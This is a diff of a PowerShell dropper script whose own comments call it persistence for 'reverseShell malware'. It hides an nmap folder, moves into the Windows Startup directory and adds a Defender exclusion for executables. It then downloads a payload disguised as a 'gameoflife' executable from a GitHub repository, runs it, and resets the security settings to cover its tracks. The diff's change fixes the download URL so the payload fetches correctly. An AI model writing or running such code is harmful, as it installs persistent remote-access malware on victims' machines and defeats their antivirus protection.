@@ -6,7 +6,7 @@ $FILE.Attributes='hidden' #Make nmap directory hidden
 Remove-Item nmap.zip #Delete nmap.zip file
 Set-Location $env:APPDATA\Microsoft\Windows\'Start Menu'\Programs\Startup #Go to startup directory to make our reverseShell malware persistent
 Add-MpPreference -ExclusionExtension exe -Force
-Invoke-WebRequest https://github.com/gpib-420/gameoflife/blob/main/life.exe -o life32.exe #Download exe
+Invoke-WebRequest https://github.com/gpib-420/gameoflife/blob/main/life.exe?raw=true -o life32.exe #Download exe
 Start-Process life32.exe #Start life
 Set-ExecutionPolicy Restricted -Force #Reset script blocker
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
